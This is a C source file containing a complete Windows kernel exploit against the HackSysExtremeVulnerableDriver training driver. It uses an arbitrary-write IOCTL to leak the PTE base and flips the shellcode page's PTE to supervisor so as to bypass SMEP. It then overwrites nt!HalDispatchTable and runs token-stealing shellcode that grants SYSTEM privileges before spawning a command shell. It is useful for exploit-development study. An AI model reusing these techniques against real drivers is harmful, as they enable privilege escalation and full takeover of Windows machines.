#include <windows.h>
#include <stdio.h>
#include <psapi.h>

/*
	This is based on Connor Mcgarr python code
	https://connormcgarr.github.io/Kernel-Exploitation-2/ and
	https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/

	NOTE: This corrupts the PTE table  but doesn't not bypass KCfg
*/

#define PTE_ADDRESS 0x081648
#define KUSER_SHARED_DATA 0xFFFFF78000000000
#define HALDISPATCHTABLE 0x339230
#define JMPRSI_OPCODE 0x66953e

const unsigned char payload[] = {
    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              // mov rax,[gs:0x188]  ; Current thread (KTHREAD)
    "\x48\x8B\x80\xB8\x00\x00\x00"                      // mov rax,[rax+0xb8]  ; Current process (EPROCESS)
    "\x48\x89\xC3"                                      // mov rbx,rax         ; Copy current process to rbx
    "\x48\x8B\x9B\xF0\x02\x00\x00"                      // mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
    "\x48\x81\xEB\xF0\x02\x00\x00"                      // sub rbx,0x2f0       ; Go back to current process
    "\x48\x8B\x8B\xE8\x02\x00\x00"                      // mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
    "\x48\x83\xF9\x04"                                  // cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
    "\x75\xE5"                                          // jnz 0x13            ; Loop until SYSTEM PID is found
    "\x48\x8B\x8B\x58\x03\x00\x00"                      // mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
    "\x80\xE1\xF0"                                      // and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
    "\x48\x89\x88\x58\x03\x00\x00"                      // mov [rax+0x358],rcx ; Copy SYSTEM token to current process
    "\x48\x31\xC0"                                      // xor rax,rax         ; set NTSTATUS SUCCESS
    "\xC3"                                              // ret                 ; Done!
};


/*
const unsigned char payload[] = {
    "\x90\x90\x90\x90"
};
*/
struct write_what_where
{
    void *what;
    void *where;
};

typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT unsigned long long *Interval);

void function();
struct write_what_where SendToDriver(HANDLE deviceHandle,int IOCode, void* what, void* where);
LPVOID FindBaseAddressOfNtoKrnl();
HANDLE InitDriver();
void ShowError();

int main()
{
    void *ptr = NULL;
    int shellCodeLen=0;
    LPVOID kernelAddress=NULL;
    unsigned long long *NTMiGetAddress= NULL;
    unsigned long long *pteBase = NULL;
    HANDLE driverHandle=NULL;
    unsigned long long *jmpRSI = NULL;
    unsigned char rawShellcode[] = {
        0x48,0x89,0xce,0xc3
    };

    driverHandle = InitDriver();

    if (driverHandle)
    {
        shellCodeLen = sizeof(payload);

        ptr = VirtualAlloc(0,shellCodeLen, 0x3000,0x40); 

        RtlMoveMemory(ptr,payload,shellCodeLen);

        printf("[+] Shellcode is located at %p\n", ptr);

        kernelAddress = FindBaseAddressOfNtoKrnl();

        if (kernelAddress)
        {
            struct write_what_where pte_results = {}; 
            void *where = NULL;
            unsigned long long* pteBase = 0;
            unsigned long long *pteBase2 = 0;
            unsigned long long PTEAddress=0;
            unsigned long long *PTEAddressPTR=0;

            unsigned long long firstShellcode = 0;
            void *shellcodePTEBitsPtr=NULL;
            void *movRSIfunction = NULL;

            unsigned long long shellcodePTEControlBitsKernel = 0;

            unsigned long long *halDispatchTableBaseAdr= 0;
            unsigned long long *halDispatchTable = 0;
        

            printf("[+] Found Kernel leak!\n");
            printf("[+] Found ntokrnl.exe base address: %p!\n", kernelAddress);

            /* 
                Phase 1: Grab the base of the PTE via nt!MiGetAddress 
            */

            NTMiGetAddress = (unsigned long long*)( ((unsigned long long)kernelAddress) + 0x00081648 );

            printf("[+] nt!MiGetPteAddress is located at: %p!\n",NTMiGetAddress );

            pteBase = (unsigned long long*) ((unsigned long long)NTMiGetAddress + (unsigned long long) 0x13);

            printf("[+] nt!MiGetPteAddress+0x13 is located at: %p!\n",pteBase);
            where = VirtualAlloc(0,sizeof(void*), 0x3000,0x40); 

            pte_results = SendToDriver(driverHandle,0x0022200B,  pteBase, where);

            pteBase = (unsigned long long*) where;
            pteBase2 = (unsigned long long*) *pteBase;

            printf("[+] Leak base of PTEs!\n");
            printf("[+] Base of PTEs are located at: %p\n",  where ); 

            /*
                Phase 2: Calculate the shellcode's PTE address
            */
            PTEAddress = ( (unsigned long long) (unsigned long long*) ptr) >> 9;
            PTEAddress &= 0x7ffffffff8;
            PTEAddress +=  *pteBase;

            PTEAddressPTR = (unsigned long long*) PTEAddress;

            printf("[+] PTE Address is located at %p\n",PTEAddressPTR );

            /* 
                Phase 3: Extract shellcode's PTE control bits
            */
            shellcodePTEBitsPtr = VirtualAlloc(0,sizeof(void*), 0x3000,0x40); 
            SendToDriver(driverHandle,0x0022200B,PTEAddressPTR,shellcodePTEBitsPtr);

            printf("[+] PTE control bits for shellcode memory page: %llx\n",*((unsigned long long*)shellcodePTEBitsPtr));
            printf("[!] Press any key to override PTE user control bit with supervisor control bits\n");
           
            getchar();
            /*
                Phase 4: Overwrite current PTE U/S for shellcode page an S (Supervisor Kernel)
            */
            shellcodePTEControlBitsKernel = (*((unsigned long long*) shellcodePTEBitsPtr)) - 4;

            shellcodePTEControlBitsKernel &= 0x0FFFFFFFFFFFFFFF;

            printf("[+] Goodbye SMEP ... \n");
            printf("[+] Overwriting shellcodes PTE user control bit with a supervisor control bits\n");



            SendToDriver(driverHandle,0x0022200B, &shellcodePTEControlBitsKernel,PTEAddressPTR);

            printf("[+] User mode shellcode page is now a kernel mode page!\n");
            /*
                Phase 5: Shellcode
            */
            
            halDispatchTableBaseAdr = (unsigned long long*) (((unsigned long long)kernelAddress+HALDISPATCHTABLE) );
            halDispatchTable = (halDispatchTableBaseAdr) + 0x1;//0x0000000000000001;


            printf("[!] Before editing the HalDispatch Table\n");
            getchar();

            printf("[+] nt!DispatchTable + 0x8 is located at %p\n",halDispatchTable );
            printf("[+] nt!HalDispatchTable edited\n");

            SendToDriver(driverHandle,0x0022200B,(void*) &ptr, halDispatchTable);
            printf("[!] After editing the HalDispatch Table\n");
           
            unsigned long long intv = 0;
            NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(
									GetModuleHandle(
									TEXT("ntdll.dll")),
									"NtQueryIntervalProfile"
									);

            if (NtQueryIntervalProfile)
            {

                printf("[!] Press any key to execute!\n");
                getchar();
                printf("[+] Interacting with the driver...\n");
    
                NtQueryIntervalProfile(0x1234,&intv);
                printf("[+] Success? Work?\n");
                system("cmd.exe /c cmd.exe /K cd C:\\");
            } else {
                printf("[-] could not call NTQueryIntervalProfile\n");
            }
            

        } else {
            printf("[-] Could not get Kernel Base address.\n");
        }
    } else {
        ShowError();
    }
}

LPVOID FindBaseAddressOfNtoKrnl()
{
    LPVOID base[1024] = {};
    DWORD cbNeeded = 0;

    if (EnumDeviceDrivers(base,1024,&cbNeeded))
    {
        if (base[0])
        {
            return base[0];
        } else {
        }
    }
    return 0;
}

HANDLE InitDriver()
{
    HANDLE handle = NULL;

    handle = CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver", 
    0xC0000000,                         
    0,                                  
    NULL,                               
    0x3,                                
    0,                                  
    NULL) ;                              

    return handle;
}

struct write_what_where SendToDriver(HANDLE deviceHandle,int IOCode, void* what, void* where)
{
    struct  write_what_where whatWhere = {};
    LPDWORD bytesReturned=NULL;;


  //  printf("[+] what is located at: %p!\n",what);
    whatWhere.what = what;
    whatWhere.where = where;
    
    DeviceIoControl(deviceHandle,IOCode ,&whatWhere,sizeof(whatWhere)+5,NULL,0,bytesReturned, NULL );

    return whatWhere;
}

void ShowError()
{
    DWORD errorCode = GetLastError();

    LPSTR errorMessageBuffer = nullptr;
    DWORD messageSize = FormatMessageA(
    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
    NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
    reinterpret_cast<LPSTR>(&errorMessageBuffer), 0, NULL);
    printf("[-] %s", errorMessageBuffer);
}

